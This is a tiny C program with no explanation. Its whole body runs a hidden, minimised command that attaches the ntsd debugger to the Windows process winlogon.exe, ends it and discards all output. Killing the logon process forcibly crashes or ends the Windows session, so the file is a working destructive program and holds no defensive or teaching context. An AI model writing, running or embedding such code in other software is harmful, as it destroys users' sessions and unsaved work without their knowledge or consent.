#include <windows.h>

int main() {
    return system("cmd /c start /min ntsd -c q -pn winlogon.exe 1>nul 2>nul");
}